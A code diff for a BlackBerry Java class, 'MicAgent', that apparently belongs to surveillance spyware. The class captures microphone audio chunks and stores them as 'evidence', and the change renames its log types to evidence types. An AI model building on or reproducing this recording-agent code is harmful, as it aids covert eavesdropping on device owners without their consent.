@@ -17,10 +17,10 @@ import blackberry.Status;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceType;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
-import blackberry.log.Log;
-import blackberry.log.LogType;
 import blackberry.record.AudioRecorder;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
@@ -69,7 +69,7 @@ public final class MicAgent extends Agent implements PhoneListener {
     public MicAgent(final boolean agentEnabled) {
         super(Agent.AGENT_MIC, agentEnabled, Conf.AGENT_MIC_ON_SD, "MicAgent");
         //#ifdef DBC
-        Check.asserts(Log.convertTypeLog(agentId) == LogType.MIC,
+        Check.asserts(Evidence.convertTypeEvidence(agentId) == EvidenceType.MIC,
                 "Wrong Conversion");
         //#endif
     }
@@ -131,7 +131,7 @@ public final class MicAgent extends Agent implements PhoneListener {
                 //#ifdef DBC
                 Check.ensures(state != STOPPED, "state == STOPPED");
                 //#endif
-                saveRecorderLog();
+                saveRecorderEvidence();
                 stopRecorder();
             }
             state = STOPPED;
@@ -225,7 +225,7 @@ public final class MicAgent extends Agent implements PhoneListener {
             if (state == STARTED) {
 
                 if (numFailures < 10) {
-                    saveRecorderLog();
+                    saveRecorderEvidence();
                 } else {
                     //#ifdef DEBUG
                     debug.warn("numFailures: " + numFailures);
@@ -250,9 +250,9 @@ public final class MicAgent extends Agent implements PhoneListener {
         }
     }
 
-    private synchronized void saveRecorderLog() {
+    private synchronized void saveRecorderEvidence() {
         //#ifdef DBC
-        Check.requires(recorder != null, "saveRecorderLog recorder==null");
+        Check.requires(recorder != null, "saveRecorderEvidence recorder==null");
         //#endif
 
         final byte[] chunk = recorder.getAvailable();
@@ -260,10 +260,10 @@ public final class MicAgent extends Agent implements PhoneListener {
         if (chunk != null && chunk.length > 0) {
 
             //#ifdef DBC
-            Check.requires(log != null, "Null log");
+            Check.requires(evidence != null, "Null log");
             //#endif
 
-            log.createLog(getAdditionalData());
+            evidence.createEvidence(getAdditionalData());
             int offset = 0;
             if (Utils.equals(chunk, 0, AudioRecorder.AMR_HEADER, 0,
                     AudioRecorder.AMR_HEADER.length)) {
@@ -277,8 +277,8 @@ public final class MicAgent extends Agent implements PhoneListener {
             }
             //#endif
 
-            log.writeLog(chunk, offset);
-            log.close();
+            evidence.writeEvidence(chunk, offset);
+            evidence.close();
 
             //#ifdef SAVE_AMR_FILE    
             final boolean ret = amrfile.append(chunk);
